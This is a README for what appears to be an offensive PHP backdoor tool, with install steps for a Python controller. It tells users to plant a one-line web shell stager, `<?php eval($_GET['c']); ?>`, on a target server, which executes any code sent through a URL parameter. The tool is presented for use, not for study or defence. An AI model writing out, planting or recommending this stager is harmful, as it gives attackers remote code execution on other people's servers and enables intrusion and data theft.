> A command line PHP backdoor with the simplest stager ever. 

It's a multi functional PHP backdoor (similar to Metasplot to some extent) that uses a very small stager to make powerful things.

## Installation

This application has been developed with Python 3.7.9 (recommended).
Although, it should work with previous (and future probably) versions of python (> 3.6).

Windows:
   - `pip install -r requirements.txt` to install the required dependencies.
   - `python main.py` to run the application.
   
Linux:
   - `pip3 install -r requirements.txt` to install the required dependencies.
   - `python3 main.py` to run the application.

## Usage example

The CLI is pretty straightforward. The commands are documented, so the user can get a description by using `help <command>`.  
For a complete list of commands, please use `help`.  

Although the interface is kinda user-friendly, you have to place the stager onto the target server.  
Don't worry, it is as simple as placing a PHP file with the following code inside:  
`<?php eval($_GET['c']); ?>`.  
Easy as that.
